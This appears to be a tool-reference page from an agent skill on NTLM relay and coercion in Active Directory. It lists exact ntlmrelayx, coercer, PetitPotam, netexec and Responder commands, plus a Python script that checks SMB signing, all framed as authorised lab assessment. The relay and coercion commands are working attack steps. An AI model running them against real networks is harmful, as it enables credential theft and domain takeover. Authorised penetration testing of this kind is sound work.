# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`ntlm-relay-and-coercion`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `netexec` | `netexec smb 10.20.30.0/24 --gen-relay-list relay.txt` | Signing-state inventory for relay targets | Linux / Windows |
| `ntlmrelayx.py` | `ntlmrelayx.py -tf relay.txt -smb2support -socks` | Relay listener, authorised lab only | Linux |
| `coercer` | `coercer coerce -t 10.20.30.10 -u lowpriv -p pass -d corp.example -l 10.20.30.99 --filter-protocol-name MS-RPRN` | Single-primitive coercion, lab only | Linux / Windows |
| `Responder` | `Responder.py -I eth0 -A` | Log-only name-resolution analysis | Linux |
| `PetitPotam.py` | `PetitPotam.py -u lowpriv -p pass -d corp.example 10.20.30.99 10.20.30.10` | EFSRPC coercion, lab only, requires EFS running | Linux / Windows |

## Minimal Lab Validation Script

Build a relay-candidate list from signing state and coercion availability, which is the part of the method that can be done without sending a coercion.

```python
import subprocess, re

def signing_state(host):
    out = subprocess.run(["nmap", "-p", "445", "--script", "smb2-security-mode", host],
                         capture_output=True, text=True).stdout
    if "signing enabled and required" in out:
        return "required"
    if "signing enabled but not required" in out:
        return "not-required"
    return "unknown"

for host in ("10.20.30.10", "10.20.30.20"):
    print(host, signing_state(host))
```

## Flag Notes

- `--gen-relay-list` writes only hosts that do not require signing, which is the actionable set.
- `--filter-protocol-name` limits coercion to one protocol, so each attempt's effect is attributable.
- `-A` puts Responder in log-only mode; answering is what turns an assessment into credential capture.
